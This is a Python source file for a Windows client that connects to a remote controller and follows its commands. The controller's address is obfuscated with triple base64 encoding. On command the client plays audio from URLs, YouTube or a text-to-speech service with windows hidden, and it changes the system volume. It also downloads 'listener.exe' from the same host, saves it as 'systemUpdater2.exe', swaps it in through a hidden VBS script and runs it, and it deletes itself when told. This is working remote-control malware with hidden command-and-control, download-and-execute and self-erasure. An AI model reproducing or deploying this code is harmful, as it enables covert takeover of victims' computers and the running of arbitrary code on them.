import socket
import json
import requests
import subprocess
import time
import os
import sys
import base64
from pycaw.pycaw import AudioUtilities

# needed tools: yt-dlp, ffmplay, pycaw, requests, 

encoded_ip = "VFZScmQweHFSVEZOZVRSNFRrUmpkVTFVVVVzPQ=="
encoded_ip = base64.b64decode(encoded_ip).decode("utf-8")
encoded_ip = base64.b64decode(encoded_ip).decode("utf-8")
HOST = base64.b64decode(encoded_ip).decode("utf-8").replace("\n", "")
PORT = 7833
RECONNECT_DELAY = 3


def send_manager(sock, payload):
    try:
        sock.sendall((json.dumps(payload) + "\n").encode())
    except Exception:
        pass


def resource_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path) # type: ignore

    return os.path.join(os.path.abspath("."), relative_path)


def get_ffplay():
    try:
        subprocess.run(
            ["ffplay", "-version"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=True,
        )
        return "ffplay"
    except Exception:
        pass

    bundled = resource_path(os.path.join("ffmpeg-bin", "ffplay.exe"))

    if os.path.exists(bundled):
        return bundled

    return None


FFPLAY = get_ffplay()


ffplay_process = None

def play_audio(content: bytes):
    global ffplay_process

    try:
        if not FFPLAY:
            raise RuntimeError("ffplay not found (PATH or bundle)")

        creationflags = 0
        if os.name == "nt":
            creationflags = subprocess.CREATE_NO_WINDOW

        ffplay_process = subprocess.Popen(
            [FFPLAY, "-nodisp", "-autoexit", "-loglevel", "quiet", "-"],
            stdin=subprocess.PIPE,
            creationflags=creationflags,
        )

        if ffplay_process.stdin:
            ffplay_process.stdin.write(content)
            ffplay_process.stdin.close()

        send_manager(s, {
            "type": "ok",
            "stage": "audio",
            "msg": f"playing {len(content):,} bytes",
            "pid": ffplay_process.pid
        })

    except Exception as e:
        send_manager(s, {
            "type": "error",
            "stage": "audio",
            "msg": str(e)
        })

def stop_audio():
    global ffplay_process

    if ffplay_process and ffplay_process.poll() is None:
        ffplay_process.kill()
        ffplay_process = None

def download_yt(url):
    process = subprocess.Popen(
        [
            sys.executable, "-m", "yt_dlp",
            "-f", "bestaudio/best",
            "-o", "-",
            "--quiet",
            "--no-warnings",
            url
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        close_fds=True
    )

    audio, error = process.communicate()

    if process.returncode != 0:
        send_manager(s, {
            "type": "error",
            "stage": "request",
            "msg": f"Error on download: {error.decode(errors='replace')}"
        })
        return None

    return audio

def self_destruct():
    if getattr(sys, "frozen", False):
        script_path = os.path.abspath(sys.executable)
    else:
        script_path = os.path.abspath(__file__)

    if not os.path.exists(script_path):
        send_manager(s, {"type": "error", "stage": "self-destruct", "msg": f"target not found: {script_path}"})
        return

    try:
        if os.name == "nt":
            import tempfile
            vbs_path = os.path.join(tempfile.gettempdir(), f"cleanup_{os.getpid()}.vbs")
            with open(vbs_path, "w") as f:
                f.write(f'WScript.Sleep 5000\n')
                f.write(f'Set fso = CreateObject("Scripting.FileSystemObject")\n')
                f.write(f'On Error Resume Next\n')
                f.write(f'fso.DeleteFile "{script_path}", True\n')
                f.write(f'fso.DeleteFile "{vbs_path}", True\n')

            cmd_command = ["wscript", "//B", "//Nologo", vbs_path]

            subprocess.Popen(
                cmd_command,
                creationflags=(
                    subprocess.DETACHED_PROCESS
                    | subprocess.CREATE_NO_WINDOW
                ),
                close_fds=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

        else:
            cmd_command = f"sleep 5 && rm -f '{script_path}'"
            subprocess.Popen(
                ["sh", "-c", cmd_command],
                start_new_session=True,
                close_fds=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

    except Exception as e:
        send_manager(s, {"type": "error", "stage": "self-destruct", "msg": str(e)})
        return

    send_manager(s, {"type": "ok", "stage": "self-destruct", "msg": f"deleting {os.path.basename(script_path)} in 5s, goodbye"})

    sys.exit(0)

def update():
    if getattr(sys, "frozen", False):
        script_path = os.path.abspath(sys.executable)
    else:
        script_path = os.path.abspath(__file__)

    if not os.path.exists(script_path):
        send_manager(s, {"type": "error", "stage": "update", "msg": f"target not found: {script_path}"})
        return

    r = requests.get(f"http://{HOST}:6767/listener.exe")
    updated_path = os.path.join(os.path.dirname(script_path), "systemUpdater2.exe")
    if r.status_code == 200:
        with open(updated_path, "wb") as f:
            f.write(r.content)
    else:
        send_manager(s, {"type": "error", "stage": "update", "msg": f"can't update server returned: {r.status_code}"})
        return

    try:
        if os.name == "nt":
            import tempfile
            vbs_path = os.path.join(tempfile.gettempdir(), f"cleanup_{os.getpid()}.vbs")
            with open(vbs_path, "w") as f:
                f.write(f'WScript.Sleep 5000\n')
                f.write(f'Set fso = CreateObject("Scripting.FileSystemObject")\n')
                f.write(f'On Error Resume Next\n')
                f.write(f'fso.DeleteFile "{script_path}", True\n')

                f.write(f'Name "{updated_path}" As "{script_path}"')

                f.write(f'Set shell = CreateObject("WScript.Shell")')
                f.write(f'shell.Run """{script_path}""", 0, False')

                f.write(f'fso.DeleteFile "{vbs_path}", True\n')

            cmd_command = ["wscript", "//B", "//Nologo", vbs_path]

            subprocess.Popen(
                cmd_command,
                creationflags=(
                    subprocess.DETACHED_PROCESS
                    | subprocess.CREATE_NO_WINDOW
                ),
                close_fds=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

        else:
            ...
            # PROGRAM WONT RUN ANYWERE ELSE BUT WINDOWS
            '''
            cmd_command = f"sleep 5 && rm -f '{script_path}' && mv {updated_path} {script_path} && nohup {script_path} > /dev/null 2>&1 &"
            subprocess.Popen(
                ["sh", "-c", cmd_command],
                start_new_session=True,
                close_fds=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            '''

    except Exception as e:
        send_manager(s, {"type": "error", "stage": "update", "msg": str(e)})
        return

    send_manager(s, {"type": "ok", "stage": "update", "msg": f"Updating {os.path.basename(script_path)} in 5s, goodbye"})

    sys.exit(0)

def connect_socket():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.sendall(b"role=listener\n")

            send_manager(s, {"type": "ok", "stage": "socket", "msg": f"connected to {HOST}:{PORT}"})

            return s

        except Exception:
            time.sleep(RECONNECT_DELAY)


devices = AudioUtilities.GetSpeakers()
s = connect_socket()
buffer = ""

while True:
    try:
        data = s.recv(4096)
        if not data:
            raise ConnectionError("Socket disconnected")

        buffer += data.decode(errors="ignore")

        while "\n" in buffer:
            line, buffer = buffer.split("\n", 1)

            if not line.strip():
                continue

            try:
                message = json.loads(line)

                send_manager(s, {"type": "ok", "stage": "dispatch", "msg": f"command type={message.get('type')}"})

            except json.JSONDecodeError:
                send_manager(
                    s, {"type": "warn", "stage": "json", "msg": "invalid_json"}
                )
                continue

            try:
                r = None
                if message.get("type") == 6:
                    update()
                    continue

                elif message.get("type") == 5:
                    audio = download_yt(message.get("url"))
                    if audio:
                        play_audio(audio)
                        send_manager(s, {"type": "ok", "stage": "request", "msg": f"Video downloaded and played"})
                    continue

                elif message.get("type") == 4:
                    stop_audio()
                    send_manager(s, {"type": "ok", "stage": "request", "msg": f"Audio stopped"})
                    continue

                elif message.get("type") == 3:
                    volume = devices.EndpointVolume # type: ignore
                    vol = max(0.0, min(1.0, float(message.get("vol"))))
                    volume.SetMasterVolumeLevelScalar(vol, None)
                    send_manager(s, {"type": "ok", "stage": "request", "msg": f"Volume changed to: {vol}"})
                    continue
                
                elif message.get("type") == 2:
                    r = requests.post(
                        "https://api.fish.audio/v1/tts",
                        headers={
                            "Authorization": f"Bearer {message['api_key']}",
                            "Content-Type": "application/json",
                            "model": "s2.1-pro-free",
                        },
                        json={"text": message.get("txt", "")},
                        timeout=15,
                    )

                elif message.get("type") == 1:
                    r = requests.get(message.get("url", ""), timeout=15)

                elif message.get("type") == 404:
                    self_destruct()

                else:
                    continue

                if r and r.content:
                    send_manager(s, {"type": "ok", "stage": "request", "msg": f"{r.status_code} · {len(r.content):,} bytes"})
                    play_audio(r.content)

            except requests.RequestException as e:
                send_manager(s, {"type": "error", "stage": "request", "msg": str(e)})

            except Exception as e:
                send_manager(s, {"type": "error", "stage": "processing", "msg": str(e)})

    except (ConnectionError, OSError) as e:
        try:
            send_manager(s, {"type": "error", "stage": "socket", "msg": str(e)})
        except Exception:
            pass

        try:
            s.close()
        except Exception:
            pass

        s = connect_socket()
        buffer = ""

    except Exception as e:
        send_manager(s, {"type": "error", "stage": "processing", "msg": str(e)})
        time.sleep(1)
